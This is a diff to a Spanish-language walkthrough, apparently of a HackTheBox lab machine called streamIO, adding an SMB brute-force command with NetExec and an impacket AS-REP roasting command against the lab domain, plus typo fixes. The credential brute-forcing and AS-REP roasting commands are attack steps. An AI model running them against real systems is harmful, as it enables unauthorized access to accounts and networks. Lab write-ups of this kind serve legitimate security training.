@@ -204,10 +204,20 @@ nxc smb 10.129.13.11 -u users.txt -p passwords.txt --no-bruteforce
 ```
 
 Ninguna es valida
+Probaremos ahora implementando fuerza bruta
+```shell
+nxc smb 10.129.13.11 -u users.txt -p passwords.txt --continue-on-success
+```
 
-Ya que tenemos de nuevo una lista de usuarios validos vamos a voklver a verifiacar si alguno es vulnerable a AS-REP Roast attack
+Siendo de nuevo un intento fallido
+
+Ya que tenemos de nuevo una lista de usuarios validos vamos a volver a verificar si alguno es vulnerable a AS-REP Roast attack
 
 ### AS-REP Roast
+```shell
+impacket-GetNPUsers -no-pass -usersfile users.txt streamIO.htb/
+```
+
 
 
 
